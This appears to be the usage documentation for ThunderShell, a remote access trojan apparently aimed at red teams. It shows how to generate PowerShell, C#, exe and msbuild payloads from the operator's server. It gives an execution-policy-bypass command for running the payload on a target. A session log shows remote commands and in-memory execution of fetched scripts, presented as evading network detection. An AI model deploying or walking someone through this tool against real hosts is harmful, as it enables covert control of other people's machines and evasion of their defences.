### Generating payloads

Currently ThunderShell supports:

* `C#` as `cs`
* `C# exe` as `exe`
* `msbuild` as `msbuild`
* `powershell` as `ps`

Note that the default option is powershell or `ps`

ThunderShell generates payloads through the web interface. The endpoint is defined by the `http-download-path` variable.  
To generate a payload simply browse to:

```
http://192.168.1.5:8080/cat.png
```

The endpoint supports several options that can be fetched using the following URL:

```
http://192.168.1.5:8443/cat.png/<type>/<delay>/
```

`<type>` supports `cs`, `exe`, `msbuild` and `ps`.  
`<delay>` is the amount of sleep in milliseconds between each callback. Its default value is `10000` (10 seconds).

The endpoint is also responsible of setting the callback URL based on the `callback-url` defined in the configuration.  
You can have a proxy in front of your server that has a different URL.

### Getting a shell

There are several ways to execute the RAT on a target. One example is to use PowerShell:

```
http://192.168.1.5:8080/cat.png/ps/
```

Once the file has been downloaded, run the following command:

```
powershell -exec bypass import-module .\file.ps1
```

The executable can be downloaded directly.

```
http://192.168.1.5:8080/cat.png/exe/
```

The raw C# data can be downloaded and modified manually.
```
http://192.168.1.5:8080/cat.png/cs/
```

### Using the CLI

The example below executes Windows and PowerShell commands directly on the target without invoking `powershell.exe`. The `fetch` command is used to obfuscate the PowerShell script. The server will download the data from the link specified, encrypt it using an RC4 key then send it to the client. The client will then perform decryption and execute the code, while avoiding network detection.

```
(Main)>>> help

Help Menu

=========

Commands    Args                                  Descriptions
----------  ------------------------------------  --------------------------------------------------------------------------------------------
list        full                                  List all active shells
interact    id                                    Interact with a session
show        (password,key,error,http,event) rows  Show server password, encryption key, errors, http or events log (default number of rows 10)
kill        id                                    kill shell (clear db only)
os          command                               Execute command on the system (local)
purge       force                                 WARNING! Delete all the Redis DB
exit                                              Exit the application
help

(Main)>>>
[+] Registering new shell DESKTOP-2JKIANV DESKTOP-2JKIANV\admin
[+] New shell ID 12 GUID is nDCCYACFWYrU6LwM

(Main)>>> interact 12

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> help

Help Menu
=========
Commands    Args            Descriptions
----------  --------------  ------------------------------------------------------------
background                  Return to the main console
fetch                       In memory execution of a script and execute a command
exec        path/url, cmd   In memory execution of code (shellcode)
read        path/url        Read a file on the remote host
upload      remote path     Upload a file on the remote system
ps          path/url, path  List processes
inject      pid, command    Inject command into a target process (max length 4096)
alias       key, value      Create an alias to avoid typing the same thing over and over
delay       milliseconds    Update the callback delay
help                        show this help menu

List of built in aliases
------------------------
wmiexec                     Remote-WmiExecute utility
searchevent                 Search-EventForUser utility

List user defined aliases
--------------------------

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> whoami

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: whoami

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
desktop-2jkianv\admin


(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> cmd.exe /c ver

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: cmd.exe /c ver

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
Microsoft Windows [Version 10.0.16299.431]

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> $psversiontable

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: $psversiontable

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
Name                           Value
----                           -----
PSVersion                      5.1.16299.431
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.16299.431
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> fetch https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1 Get-IEBookmarks

[+] Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1
[+] Executing Get-IEBookmarks

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: function Get-IEBookmarks {
        # Mr.Un1k0d3r - RingZer0 Team 2016
        # Get IE bookmarks URL

        BEGIN {
                $path = [Environment]::GetFolderPath('Favorites')
                Write-Output "[+] Bookmark are located in $($path)"
        }

        PROCESS {
                Get-ChildItem -Recurse $path -Include "*.url" | ForEach {
                                $data = Get-Content $_.fullname | Select-String -Pattern URL
                                Write-Output $data
                        }
        }

        END {
                Write-Output "[+] Process completed..."
        }
}
;Get-IEBookmarks

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
[+] Bookmark are located in C:\Users\admin\Favorites

URL=http://go.microsoft.com/fwlink/p/?LinkId=255142
[+] Process completed...

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
```
